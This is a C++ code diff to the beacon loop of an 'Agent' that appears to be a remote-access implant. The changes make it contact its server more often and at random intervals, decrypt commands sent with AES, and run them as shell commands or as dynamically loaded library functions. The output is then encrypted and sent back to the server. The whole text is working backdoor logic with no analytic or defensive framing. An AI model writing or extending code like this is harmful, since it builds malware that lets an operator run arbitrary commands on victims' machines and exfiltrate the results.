@@ -136,7 +136,7 @@ void Agent::CreateNewSymetricKeyWithThread()
 
 /*
 	Get request from server and execute the command or call a function in components
-	Do this every 2-3 minutes
+	Do this every 1-2 minutes
 */
 void Agent::GetRequestFromServer()
 {
@@ -150,35 +150,52 @@ void Agent::GetRequestFromServer()
 		SendMessageToServer(m.c_str(), m.size());
 		ReciveMessage();
 
-		vector<string> res = split(string(recvbuf));
-		vector<string>::iterator it = res.begin();
-
-		// Take action from command
-		if (!strcmp(it->c_str(), "3"))
+		string req = string(recvbuf);
+		if (!req.empty())
 		{
-			++it;
-			string todo = *it;
-			++it;
-			if (todo.compare("cmd"))
+			vector<string> res = split(aes.Decrypt(req));
+			vector<string>::iterator it = res.begin();
+
+			// Take action from command
+			if (!strcmp(it->c_str(), "3"))
 			{
-				string action = *it;
-				exec(action);
-			}
-			else if (todo.compare("func"))
-			{
-				string library = *it;
-				string func = *(++it);
-				string cmd = *(++it);
-				while (it != res.end())
+				string responce;
+
+				++it;
+				string todo = *it;
+				++it;
+				if (!todo.compare("cmd"))
 				{
-					cmd.append(*(++it));
+					string action = *it;
+					responce = exec(action);
 				}
-				runDynamicFunction(library, func, cmd);
+				else if (!todo.compare("func"))
+				{
+					string library = *it;
+					string func = *(++it);
+					string cmd = *(++it);
+					while (it != res.end())
+					{
+						cmd.append(*(++it));
+					}
+					responce = runDynamicFunction(library, func, cmd);
+				}
+
+				if (!responce.empty())
+				{
+					CreateSocket();
+					string message = string("4 ").append(responce);
+					string m = aes.Encrypt(message);
+
+					//send and receive messages
+					SendMessageToServer(m.c_str(), m.size());
+					ReciveMessage();
+				}
 			}
 		}
-		double r = ((double)rand() / (RAND_MAX)) + 1;
+		double r = ((double)rand() / (RAND_MAX));
 
-		Sleep(r * 60 * 1000);
+		Sleep(r * 30 * 1000);
 	}
 }
 /*
